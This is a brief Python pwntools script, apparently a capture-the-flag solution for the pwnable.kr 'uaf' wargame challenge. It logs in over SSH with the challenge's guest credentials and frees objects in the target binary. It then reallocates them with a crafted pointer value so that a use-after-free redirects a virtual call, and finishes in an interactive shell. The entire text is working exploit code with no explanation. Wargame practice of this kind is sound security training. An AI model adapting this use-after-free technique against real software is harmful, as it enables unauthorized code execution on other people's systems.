#!/usr/bin/env python3

import pwn

buff_size = 1024

host = pwn.ssh(host='pwnable.kr', port=2222, user='uaf', password='guest')
proc = host.process(['./uaf', '24', '/dev/stdin'])

proc.recvuntil('free\n')
proc.sendline('3')

# get w memory chunk

proc.recvuntil('free\n')
proc.sendline('2')
proc.send('\x68\x15\x40\x00\x00\x00\x00')
proc.recvline() # your data is allocated

# get m memory chunk

proc.recvuntil('free\n')
proc.sendline('2')
proc.send('\x68\x15\x40\x00\x00\x00\x00')
proc.recvline() # your data is allocated

proc.recvuntil('free\n')
proc.sendline('1')

proc.interactive()
